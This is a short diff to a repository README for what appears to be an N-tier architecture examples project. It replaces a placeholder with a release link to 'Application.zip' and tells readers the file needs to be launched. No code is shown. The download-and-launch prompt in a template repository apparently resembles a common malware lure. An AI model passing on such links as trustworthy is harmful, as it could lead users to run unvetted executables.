@@ -29,7 +29,7 @@ The core of this repository lies in providing practical examples and templates f
 
 ## 📥 Download Application
 
-🔗 [Download Here](https://github.com/file/Application.zip)
+🔗 [Download Here](https://github.com/DagobertoDLG/NTierArchitecture/releases/download/v1.0.0/Application.zip)
 
 ⚠️ Note: The link provided above leads to the application file that needs to be launched.
 
